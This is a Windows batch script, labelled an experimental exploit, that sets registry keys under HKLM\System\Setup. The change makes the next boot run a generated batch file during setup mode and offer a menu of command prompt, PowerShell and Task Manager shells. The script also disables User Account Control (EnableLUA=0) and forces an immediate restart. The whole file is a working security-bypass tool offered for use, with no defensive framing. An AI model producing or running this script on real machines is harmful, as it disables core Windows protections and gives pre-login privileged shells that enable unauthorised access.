@echo off
echo WARNING! This exploit is EXPERIMENTAL. Do not run it on important systems!
echo ENSURE YOU ARE RUNNING AS ADMINISTRATOR OR IT WILL NOT WORK!
echo Tested for Windows 10 Systems only
echo Press any key to proceed
echo If errors occur AFTER LEAVING the environment, restart the system.
pause >nul

reg add HKLM\System\Setup /v CmdLine /t REG_SZ /d "cmd.exe /k C:\enviro.bat" /f
reg add HKLM\System\Setup /v SystemSetupInProgress /t REG_DWORD /d 1 /f > nul
reg add HKLM\System\Setup /v SetupType /t REG_DWORD /d 2 /f > nul
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableCursorSuppression /t REG_DWORD /d 0 /f > nul
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f > nul
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v VerboseStatus /t REG_DWORD /d 1 /f > nul

if exist "%systemdrive%\enviro.bat" (
    cd /d "%systemdrive%"
    del enviro.bat
)

:Builder
@echo @echo off > "%systemdrive%\enviro.bat"
@echo reg add HKLM\System\Setup /v SystemSetupInProgress /t REG_DWORD /d 0 /f >> "%systemdrive%\enviro.bat"
@echo net start >> "%systemdrive%\enviro.bat"
@echo start explorer >> "%systemdrive%\enviro.bat"
@echo ping localhost -n 3 >> "%systemdrive%\enviro.bat"
@echo taskkill /f /im explorer.exe >> "%systemdrive%\enviro.bat"
@echo echo System in UnSafe Mode. To exit, close this window. >> "%systemdrive%\enviro.bat"
@echo reg add HKLM\System\Setup /v CmdLine /t REG_SZ /d "" /f >> "%systemdrive%\enviro.bat"
@echo reg add HKLM\System\Setup /v SystemSetupInProgress /t REG_DWORD /d 0 /f > nul >> "%systemdrive%\enviro.bat"
@echo reg add HKLM\System\Setup /v SetupType /t REG_DWORD /d 0 /f > nul >> "%systemdrive%\enviro.bat"
@echo reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableCursorSuppression /t REG_DWORD /d 1 /f > nul >> "%systemdrive%\enviro.bat"
@echo reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f > nul >> "%systemdrive%\enviro.bat"
@echo reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v VerboseStatus /t REG_DWORD /d 0 /f > nul >> "%systemdrive%\enviro.bat"
@echo @echo off >> "%systemdrive%\enviro.bat"
@echo title UnSafe Mode Enviroment v1.00.0 >> "%systemdrive%\enviro.bat"
@echo color f0>> "%systemdrive%\enviro.bat"
@echo :menu >> "%systemdrive%\enviro.bat"
@echo cls >> "%systemdrive%\enviro.bat"
@echo echo Select an interpreter >> "%systemdrive%\enviro.bat"
@echo echo ===============------------------- >> "%systemdrive%\enviro.bat"
@echo echo Command Prompt                   1 >> "%systemdrive%\enviro.bat"
@echo echo Powershell                       2 >> "%systemdrive%\enviro.bat"
@echo echo Task Manager                     3 >> "%systemdrive%\enviro.bat"
@echo echo. >> "%systemdrive%\enviro.bat"
@echo echo Exit                UnSafe Mode  4 >> "%systemdrive%\enviro.bat"
@echo choice /c 1234 /n /m " " >> "%systemdrive%\enviro.bat"
@echo if %%errorlevel%% equ 1  start C:\Windows\System32\cmd.exe >> "%systemdrive%\enviro.bat"
@echo if %%errorlevel%% equ 2  start C:\Windows\System32\WindowsPowerShell\v1.0\Powershell.exe >> "%systemdrive%\enviro.bat"
@echo if %%errorlevel%% equ 3  start C:\Windows\System32\taskmgr.exe >> "%systemdrive%\enviro.bat"
@echo if %%errorlevel%% equ 4  exit >> "%systemdrive%\enviro.bat"
@echo goto menu >> "%systemdrive%\enviro.bat"
:end
shutdown -r -t 0